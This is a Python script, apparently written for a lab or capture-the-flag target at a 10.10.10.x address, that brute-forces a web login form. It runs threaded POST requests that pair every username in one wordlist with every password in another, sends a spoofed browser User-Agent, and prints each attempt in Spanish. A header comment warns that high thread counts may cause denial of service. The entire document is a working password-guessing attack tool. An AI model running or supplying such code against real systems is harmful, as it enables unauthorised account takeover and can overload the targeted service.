#!/usr/bin/python3

# Fuzzing básico con selección de threads.
# CAUTION: May cause DoS with high num_threads values. Untested.

import requests
import threading

def make_curl_request(url, username, password):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    }
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, headers=headers, data=data)
    return response

def check_credentials(url, username, passwords):
    for password in passwords:
        password = password.strip()
        response = make_curl_request(url, username, password)
        
        if response.status_code == 200:
            print(f'Inicio de sesión exitoso - Usuario: {username}, Contraseña: {password}')
            break
        else:
            print(f'Inicio de sesión fallido - Usuario: {username}, Contraseña: {password}')

def main():
    url = 'http://10.10.10.92:3366'
    
    usernames_file = 'usernames.txt'
    passwords_file = 'passwords.txt'
    
    num_threads = 5 # CAUTION
    
    with open(usernames_file, 'r') as usernames, open(passwords_file, 'r') as passwords:
        usernames_list = usernames.readlines()
        passwords_list = passwords.readlines()
        
        threads = []
        
        for username in usernames_list:
            username = username.strip()
            thread = threading.Thread(target=check_credentials, args=(url, username, passwords_list))
            thread.start()
            threads.append(thread)
        

        for thread in threads:
            thread.join()

if __name__ == '__main__':
    main()
